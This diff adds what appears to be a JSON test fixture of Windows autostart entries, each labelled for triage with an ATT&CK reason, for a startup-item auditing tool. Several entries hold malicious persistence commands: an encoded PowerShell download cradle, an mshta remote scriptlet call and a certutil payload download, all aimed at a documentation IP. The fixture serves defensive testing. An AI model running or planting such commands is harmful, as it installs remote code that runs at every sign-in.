@@ -1,0 +1,429 @@
+[
+ {
+  "entry": {
+   "id": "P01",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "OneDriveUpdate",
+   "display_name": "OneDriveUpdate",
+   "description": "",
+   "command": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=",
+   "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "args": "",
+   "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Catalog",
+    "isOsBinary": true,
+    "signer": "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
+    "company": "Microsoft Corporation",
+    "description": "Windows PowerShell"
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1547.001 Run key + T1027 encoded download cradle"
+ },
+ {
+  "entry": {
+   "id": "P02",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "Windows Host Process",
+   "display_name": "Windows Host Process",
+   "description": "",
+   "command": "\"%USERPROFILE%\\AppData\\Local\\Temp\\svchost.exe\"",
+   "exe": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost.exe",
+   "args": "",
+   "target": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "NotSigned",
+    "sigType": "None",
+    "isOsBinary": false,
+    "description": "Host Process for Windows Services"
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1036.005 svchost.exe look-alike in Temp"
+ },
+ {
+  "entry": {
+   "id": "P03",
+   "kind": "task",
+   "scope": "user",
+   "location": "\\Microsoft\\Windows\\WindowsUpdate\\",
+   "name": "WindowsUpdateCheck",
+   "display_name": "WindowsUpdateCheck",
+   "description": "",
+   "command": "\"C:\\ProgramData\\WinUpdate\\wuauclt.exe\" /detectnow",
+   "exe": "C:\\ProgramData\\WinUpdate\\wuauclt.exe",
+   "args": "",
+   "target": "C:\\ProgramData\\WinUpdate\\wuauclt.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "when you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "NotSigned",
+    "sigType": "None",
+    "isOsBinary": false,
+    "description": "Windows Update"
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1053.005 task hidden among Windows tasks"
+ },
+ {
+  "entry": {
+   "id": "P04",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "SystemSync",
+   "display_name": "SystemSync",
+   "description": "",
+   "command": "C:\\Windows\\System32\\mshta.exe \"javascript:a=GetObject('script:https://203.0.113.7/x.sct').Exec();close();\"",
+   "exe": "C:\\Windows\\System32\\mshta.exe",
+   "args": "",
+   "target": "C:\\Windows\\System32\\mshta.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Catalog",
+    "isOsBinary": true,
+    "signer": "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
+    "company": "Microsoft Corporation",
+    "description": "Microsoft (R) HTML Application host"
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1218.005 mshta inline script"
+ },
+ {
+  "entry": {
+   "id": "P05",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "AudioHelper",
+   "display_name": "AudioHelper",
+   "description": "",
+   "command": "C:\\Windows\\System32\\rundll32.exe \"C:\\Users\\Public\\Libraries\\audiohlp.dll\",DllMain",
+   "exe": "C:\\Windows\\System32\\rundll32.exe",
+   "args": "",
+   "target": "C:\\Users\\Public\\Libraries\\audiohlp.dll",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "NotSigned",
+    "sigType": "None",
+    "isOsBinary": false
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1218.011 rundll32 + DLL in a public folder"
+ },
+ {
+  "entry": {
+   "id": "P06",
+   "kind": "startup",
+   "scope": "user",
+   "location": "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+   "name": "Printer Driver Helper",
+   "display_name": "Printer Driver Helper",
+   "description": "",
+   "command": "C:\\Windows\\System32\\wscript.exe //B \"%APPDATA%\\PrinterHelper\\update.vbs\"",
+   "exe": "C:\\Windows\\System32\\wscript.exe",
+   "args": "",
+   "target": "%APPDATA%\\PrinterHelper\\update.vbs",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "NotSigned",
+    "sigType": "None",
+    "isOsBinary": false
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1547.001 Startup folder + T1059.005 VBScript"
+ },
+ {
+  "entry": {
+   "id": "P07",
+   "kind": "service",
+   "scope": "user",
+   "location": "Services",
+   "name": "SvcHostHelper",
+   "display_name": "SvcHostHelper",
+   "description": "",
+   "command": "C:\\Windows\\Temp\\svchelper.exe -k netsvcs",
+   "exe": "C:\\Windows\\Temp\\svchelper.exe",
+   "args": "",
+   "target": "C:\\Windows\\Temp\\svchelper.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "when Windows starts",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "NotSigned",
+    "sigType": "None",
+    "isOsBinary": false
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1543.003 service running from Windows\\Temp"
+ },
+ {
+  "entry": {
+   "id": "P08",
+   "kind": "task",
+   "scope": "user",
+   "location": "\\",
+   "name": "CertSync",
+   "display_name": "CertSync",
+   "description": "",
+   "command": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://203.0.113.7/p.exe %TEMP%\\p.exe",
+   "exe": "C:\\Windows\\System32\\certutil.exe",
+   "args": "",
+   "target": "C:\\Windows\\System32\\certutil.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "when you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Catalog",
+    "isOsBinary": true,
+    "signer": "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
+    "company": "Microsoft Corporation",
+    "description": "CertUtil.exe"
+   }
+  },
+  "expected": "investigate",
+  "category": null,
+  "why": "T1105 certutil download"
+ },
+ {
+  "entry": {
+   "id": "P09",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "OldVPN Tray",
+   "display_name": "OldVPN Tray",
+   "description": "",
+   "command": "\"C:\\Program Files (x86)\\OldVPN\\vpntray.exe\" /tray",
+   "exe": "C:\\Program Files (x86)\\OldVPN\\vpntray.exe",
+   "args": "",
+   "target": "C:\\Program Files (x86)\\OldVPN\\vpntray.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": false
+   }
+  },
+  "expected": "lay_to_rest",
+  "category": null,
+  "why": "leftover of an uninstalled VPN"
+ },
+ {
+  "entry": {
+   "id": "P10",
+   "kind": "task",
+   "scope": "user",
+   "location": "\\",
+   "name": "GameLauncherUpdate",
+   "display_name": "GameLauncherUpdate",
+   "description": "",
+   "command": "\"%LOCALAPPDATA%\\GameLauncher\\updater.exe\" --check",
+   "exe": "%LOCALAPPDATA%\\GameLauncher\\updater.exe",
+   "args": "",
+   "target": "%LOCALAPPDATA%\\GameLauncher\\updater.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "when you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": false
+   }
+  },
+  "expected": "lay_to_rest",
+  "category": null,
+  "why": "leftover of an uninstalled game launcher"
+ },
+ {
+  "entry": {
+   "id": "P11",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "Spotify",
+   "display_name": "Spotify",
+   "description": "",
+   "command": "\"%APPDATA%\\Spotify\\Spotify.exe\" --autostart --minimized",
+   "exe": "%APPDATA%\\Spotify\\Spotify.exe",
+   "args": "",
+   "target": "%APPDATA%\\Spotify\\Spotify.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Authenticode",
+    "isOsBinary": false,
+    "signer": "CN=\"Spotify AB\", O=\"Spotify AB\", C=US",
+    "company": "Spotify AB",
+    "description": "Spotify",
+    "product": "Spotify"
+   }
+  },
+  "expected": "optional",
+  "category": "media",
+  "why": "benign: signed app in a user folder"
+ },
+ {
+  "entry": {
+   "id": "P12",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "Steam",
+   "display_name": "Steam",
+   "description": "",
+   "command": "\"C:\\Program Files (x86)\\Steam\\steam.exe\" -silent",
+   "exe": "C:\\Program Files (x86)\\Steam\\steam.exe",
+   "args": "",
+   "target": "C:\\Program Files (x86)\\Steam\\steam.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Authenticode",
+    "isOsBinary": false,
+    "signer": "CN=\"Valve Corp.\", O=\"Valve Corp.\", C=US",
+    "company": "Valve Corp.",
+    "description": "Steam",
+    "product": "Steam"
+   }
+  },
+  "expected": "optional",
+  "category": "game-launcher",
+  "why": "benign"
+ },
+ {
+  "entry": {
+   "id": "P13",
+   "kind": "task",
+   "scope": "user",
+   "location": "\\",
+   "name": "Adobe Acrobat Update Task",
+   "display_name": "Adobe Acrobat Update Task",
+   "description": "",
+   "command": "\"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe\"",
+   "exe": "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe",
+   "args": "",
+   "target": "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "when you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Authenticode",
+    "isOsBinary": false,
+    "signer": "CN=\"Adobe Inc.\", O=\"Adobe Inc.\", C=US",
+    "company": "Adobe Inc.",
+    "description": "Adobe Reader and Acrobat Manager",
+    "product": "Adobe Reader and Acrobat Manager"
+   }
+  },
+  "expected": "keep",
+  "category": "updater",
+  "why": "benign updater"
+ },
+ {
+  "entry": {
+   "id": "P14",
+   "kind": "run",
+   "scope": "user",
+   "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+   "name": "com.squirrel.Teams.Teams",
+   "display_name": "com.squirrel.Teams.Teams",
+   "description": "",
+   "command": "\"%LOCALAPPDATA%\\Microsoft\\Teams\\Update.exe\" --processStart \"Teams.exe\"",
+   "exe": "%LOCALAPPDATA%\\Microsoft\\Teams\\Update.exe",
+   "args": "",
+   "target": "%LOCALAPPDATA%\\Microsoft\\Teams\\Update.exe",
+   "enabled": true,
+   "state": "Ready",
+   "trigger": "every time you sign in",
+   "wake_to_run": false,
+   "running": null,
+   "file": {
+    "exists": true,
+    "sigStatus": "Valid",
+    "sigType": "Authenticode",
+    "isOsBinary": false,
+    "signer": "CN=\"Microsoft Corporation\", O=\"Microsoft Corporation\", C=US",
+    "company": "Microsoft Corporation",
+    "description": "Microsoft Teams",
+    "product": "Microsoft Teams"
+   }
+  },
+  "expected": "optional",
+  "category": "chat-social",
+  "why": "benign: chat app via Squirrel updater"
+ }
+]
